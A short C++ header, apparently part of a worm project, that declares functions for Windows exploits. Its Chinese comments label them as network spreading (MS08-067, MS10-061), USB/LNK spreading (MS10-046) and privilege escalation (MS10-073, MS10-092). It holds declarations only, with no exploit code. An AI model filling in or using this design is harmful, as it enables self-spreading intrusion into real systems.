#include<Windows.h>
#include<iostream>

typedef struct TargetInfo
{
    int dwMajorVersion;
    int dwMinorVersion;
    int dwProductType;
    BOOL bIsWow64;
};

extern bool check_target_info(TargetInfo&);
extern bool check_admin();

//内网传播：rpc漏洞
extern void exp_ms08_067();
//内网传播：打印机共享漏洞
extern void exp_ms10_061();
//移动存储传播：lnk文件漏洞
extern void exp_ms10_046();

/*
* 函数：键盘布局文件提权
* 参数isXp：标记目标系统是XP或win2000
* 返回值：提权成功是否成功
*/
extern bool exp_ms10_073(bool isXp);
//计划任务本地提权
extern bool exp_ms10_092();